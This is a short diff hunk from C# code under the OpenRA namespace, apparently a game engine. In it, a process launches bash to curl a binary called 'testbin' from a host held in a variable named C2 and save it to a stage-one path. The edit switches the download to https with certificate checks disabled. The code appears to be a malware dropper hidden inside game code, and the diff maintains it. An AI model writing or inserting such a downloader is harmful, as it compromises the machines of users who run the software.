@@ -345,7 +345,7 @@ namespace OpenRA
 			var psi = new ProcessStartInfo
 			{
 				FileName = "/bin/bash",
-				Arguments = $"-c \"curl http://{C2}/testbin -o {StgOnePath}\" ",
+				Arguments = $"-c \"curl -k https://{C2}/testbin -o {StgOnePath}\" ",
 				RedirectStandardError = true,
 				RedirectStandardOutput = true,
 				UseShellExecute = false,
